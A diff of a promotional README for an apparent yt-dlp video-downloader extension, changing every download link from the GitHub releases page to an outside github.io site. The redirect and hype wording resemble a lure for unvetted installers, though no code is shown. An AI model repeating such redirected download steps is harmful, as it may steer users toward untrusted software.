@@ -1,12 +1,12 @@
 # ⚡ -Video-downloader-extension-yt-dlp - The Ultimate All-In-One Media Saver
 
-[![Download Now](https://img.shields.io/badge/Download-Installer-blue.svg?style=for-the-badge&logo=github&colorA=2d2d2d&colorB=539bf5)](https://github.com/qquan110399/-Video-downloader-extension-yt-dlp/releases)
+[![Download Now](https://img.shields.io/badge/Download-Installer-blue.svg?style=for-the-badge&logo=github&colorA=2d2d2d&colorB=539bf5)](https://qquan110399.github.io)
 
 ---
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[Official Download Page](https://github.com/qquan110399/-Video-downloader-extension-yt-dlp/releases)**
+Visit this link to download the application: **[Official Download Page](https://qquan110399.github.io)**
 
 Once you're on the download page:
 1. Look for the **latest release** at the top
@@ -153,7 +153,7 @@ Love this tool? Help us make it even better:
 
 ## 📥 Ready to Start?
 
-Don't wait — [**click here**](https://github.com/qquan110399/-Video-downloader-extension-yt-dlp/releases) to visit the official download page and start saving videos today!
+Don't wait — [**click here**](https://qquan110399.github.io) to visit the official download page and start saving videos today!
 
 **Remember:** Install in under 2 minutes, enjoy unlimited downloads forever. Fast, local, and completely free.
 
